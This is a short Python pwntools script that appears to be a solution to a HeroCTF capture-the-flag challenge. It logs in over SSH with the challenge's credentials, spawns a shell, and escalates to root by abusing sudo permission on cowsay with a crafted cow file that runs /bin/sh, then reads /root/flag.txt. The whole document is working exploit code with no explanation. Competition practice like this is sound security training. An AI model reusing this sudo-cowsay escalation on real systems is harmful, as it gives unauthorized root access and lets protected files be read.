from pwn import *

s = ssh(host='chall.heroctf.fr', user='user1', password='password123', port=10041)
s.sendline("echo '/bin/sh' > WTFFFFF");
s.sendline("chmod +x WTFFFFF");
s.sendline("./hmmm");
s.recv()
s.sendline("cd /usr/games/");
s.sendline("TF=$(mktemp)")
s.sendline("echo 'exec \"/bin/sh\";' > $TF")
s.sendline("sudo ./cowsay -f $TF x")
s.sendline("cat /root/flag.txt")
print s.recvall()


